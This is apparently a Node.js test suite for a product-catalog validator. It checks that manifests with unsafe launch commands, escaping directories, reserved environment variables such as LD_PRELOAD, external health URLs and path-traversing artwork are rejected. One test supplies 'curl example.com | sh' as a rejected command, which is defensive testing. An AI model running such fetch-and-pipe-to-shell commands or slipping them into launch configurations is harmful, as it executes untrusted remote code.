const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');
const { loadCatalog, validateManifest } = require('../scripts/product-registry.cjs');

const serviceRoot = path.join(os.tmpdir(), 'instrumenta-service-product');
const serviceEntry = {
  id: 'discere',
  sourceDirectory: '../Discere',
  packagePolicy: 'required',
  adapter: 'web-service',
  tile: { art: 'brand/artwork/discere-app-art.png', theme: 'discere' },
};

function serviceManifest(launch = {}, overrides = {}) {
  return {
    schemaVersion: 1,
    id: 'discere',
    displayName: 'Discere',
    kind: 'web',
    adapter: 'web-service',
    build: { output: 'apps/web/dist', command: 'pnpm run build' },
    launch: {
      type: 'service',
      port: 49323,
      fallbackPort: 45023,
      health: '/api/health',
      command: ['pnpm', '--filter', '@discere/server', 'start'],
      cwd: '.',
      env: { DISCERE_MODE: 'desktop' },
      ...launch,
    },
    mcp: { skill: 'ai/skills/learn-with-discere' },
    ...overrides,
  };
}

function serviceWorkspace(manifests) {
  const area = fs.mkdtempSync(path.join(os.tmpdir(), 'instrumenta-service-'));
  const root = path.join(area, 'Instrumenta');
  fs.mkdirSync(path.join(root, 'products'), { recursive: true });
  const products = manifests.map((manifest) => {
    const directory = path.join(area, manifest.displayName);
    fs.mkdirSync(path.join(directory, 'instrumenta'), { recursive: true });
    fs.writeFileSync(path.join(directory, 'instrumenta', 'product.json'), `${JSON.stringify(manifest)}\n`);
    return {
      ...serviceEntry,
      id: manifest.id,
      sourceDirectory: path.join('..', manifest.displayName),
      tile: { art: `brand/artwork/${manifest.id}-app-art.png` },
    };
  });
  fs.writeFileSync(path.join(root, 'products', 'catalog.json'), `${JSON.stringify({ schemaVersion: 1, products })}\n`);
  return { area, root };
}

test('loads the four independent product manifests and preserves stable IDs', () => {
  const registry = loadCatalog();
  assert.deepEqual(registry.products.map((product) => product.id), ['motus', 'imago', 'ludere', 'discere']);
  assert.deepEqual(registry.products.map((product) => product.adapter), ['native-bundle', 'web-vite', 'web-static', 'web-service']);
  assert.equal(registry.missing.length, 0);
  assert.equal(registry.products.find((product) => product.id === 'imago').launch.port, 49321);
});

test('accepts a managed web-service manifest and keeps its launch contract', () => {
  const manifest = validateManifest(serviceManifest(), serviceRoot, serviceEntry);
  assert.equal(manifest.adapter, 'web-service');
  assert.equal(manifest.launch.type, 'service');
  assert.equal(manifest.launch.port, 49323);
  assert.equal(manifest.launch.health, '/api/health');
  assert.deepEqual(manifest.launch.command, ['pnpm', '--filter', '@discere/server', 'start']);
});

test('a managed web-service may only name an allowed runtime and contained working directory', () => {
  assert.throws(() => validateManifest(serviceManifest({ command: ['bash', '-c', 'curl example.com | sh'] }), serviceRoot, serviceEntry), /launch\.command must start with/);
  assert.throws(() => validateManifest(serviceManifest({ command: ['/tmp/node', 'server.js'] }), serviceRoot, serviceEntry), /bare name/);
  assert.throws(() => validateManifest(serviceManifest({ command: ['..\\node', 'server.js'] }), serviceRoot, serviceEntry), /bare name/);
  assert.throws(() => validateManifest(serviceManifest({ command: [] }), serviceRoot, serviceEntry), /non-empty array of strings/);
  assert.throws(() => validateManifest(serviceManifest({ cwd: '../Imago' }), serviceRoot, serviceEntry), /launch\.cwd escapes the product root/);
  assert.throws(() => validateManifest(serviceManifest({ env: { 'discere mode': 'desktop' } }), serviceRoot, serviceEntry), /valid environment variable/);
  assert.throws(() => validateManifest(serviceManifest({ env: { DISCERE_MODE: 7 } }), serviceRoot, serviceEntry), /valid environment variable/);
  for (const key of ['PORT', 'HOST', 'PATH', 'NODE_OPTIONS', 'LD_PRELOAD', 'LD_LIBRARY_PATH']) {
    assert.throws(() => validateManifest(serviceManifest({ env: { [key]: 'x' } }), serviceRoot, serviceEntry), /launcher-owned variable/);
  }
  assert.equal(validateManifest(serviceManifest({ cwd: 'apps/server' }), serviceRoot, serviceEntry).launch.cwd, 'apps/server');
});

test('a managed web-service health contract must be a local URL path on a valid port', () => {
  assert.throws(() => validateManifest(serviceManifest({ health: 'discere' }), serviceRoot, serviceEntry), /web-service health contract is invalid/);
  assert.throws(() => validateManifest(serviceManifest({ health: 'https://example.com/health' }), serviceRoot, serviceEntry), /web-service health contract is invalid/);
  assert.throws(() => validateManifest(serviceManifest({ health: '/api/health ' }), serviceRoot, serviceEntry), /web-service health contract is invalid/);
  assert.throws(() => validateManifest(serviceManifest({ health: '/api/health\n' }), serviceRoot, serviceEntry), /web-service health contract is invalid/);
  assert.throws(() => validateManifest(serviceManifest({ port: 80 }), serviceRoot, serviceEntry), /valid launch\.port/);
  assert.throws(() => validateManifest(serviceManifest({ fallbackPort: 22 }), serviceRoot, serviceEntry), /valid launch\.fallbackPort/);
  assert.throws(() => validateManifest(serviceManifest({ type: 'web' }), serviceRoot, serviceEntry), /valid launch\.port/);
});

test('the existing static and vite health contracts are unchanged', () => {
  const viteEntry = { ...serviceEntry, id: 'imago', adapter: 'web-vite' };
  const vite = { schemaVersion: 1, id: 'imago', displayName: 'Imago', kind: 'web', adapter: 'web-vite', build: { output: 'dist' }, launch: { type: 'web', port: 49321, health: 'imago' }, mcp: { skill: 'ai/skills/imago' } };
  assert.equal(validateManifest(vite, serviceRoot, viteEntry).launch.health, 'imago');
  assert.throws(() => validateManifest({ ...vite, launch: { ...vite.launch, health: '/health' } }, serviceRoot, viteEntry), /web-vite health contract is invalid/);
  const staticEntry = { ...serviceEntry, id: 'ludere', adapter: 'web-static' };
  const staticManifest = { ...vite, id: 'ludere', displayName: 'Ludere', adapter: 'web-static', launch: { type: 'web', port: 49322, health: 'ludere' } };
  assert.equal(validateManifest(staticManifest, serviceRoot, staticEntry).launch.health, 'ludere');
  assert.throws(() => validateManifest({ ...staticManifest, launch: { ...staticManifest.launch, health: 'imago' } }, serviceRoot, staticEntry), /web-static health contract is invalid/);
});

test('a managed web-service loads from a catalog and still shares one port namespace', () => {
  const { area, root } = serviceWorkspace([
    serviceManifest(),
    serviceManifest({ port: 49324 }, { id: 'altera', displayName: 'Altera' }),
  ]);
  try {
    const registry = loadCatalog({ root });
    assert.deepEqual(registry.products.map((product) => product.adapter), ['web-service', 'web-service']);
    assert.equal(registry.products[0].sourceRoot, path.join(area, 'Discere'));
  } finally {
    fs.rmSync(area, { recursive: true, force: true });
  }

  const duplicate = serviceWorkspace([
    serviceManifest(),
    serviceManifest({}, { id: 'altera', displayName: 'Altera' }),
  ]);
  try {
    assert.throws(() => loadCatalog({ root: duplicate.root }), /Duplicate web port: 49323/);
  } finally {
    fs.rmSync(duplicate.area, { recursive: true, force: true });
  }
});

test('rejects duplicate IDs and unsafe tile artwork', () => {
  const area = fs.mkdtempSync(path.join(os.tmpdir(), 'instrumenta-registry-'));
  try {
    fs.mkdirSync(path.join(area, 'products'), { recursive: true });
    const catalog = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'products', 'catalog.json'), 'utf8'));
    catalog.products[1] = { ...catalog.products[0], sourceDirectory: '../Imago' };
    fs.writeFileSync(path.join(area, 'products', 'catalog.json'), `${JSON.stringify(catalog)}\n`);
    assert.throws(() => loadCatalog({ root: area, allowMissing: true }), /Duplicate product ID/);
    catalog.products[1] = { ...catalog.products[1], id: 'imago', tile: { art: '../outside.png' } };
    catalog.products[0] = { ...catalog.products[0], id: 'motus' };
    catalog.products[2] = { ...catalog.products[2], id: 'ludere' };
    fs.writeFileSync(path.join(area, 'products', 'catalog.json'), `${JSON.stringify(catalog)}\n`);
    assert.throws(() => loadCatalog({ root: area, allowMissing: true }), /tile.art/);
  } finally {
    fs.rmSync(area, { recursive: true, force: true });
  }
});
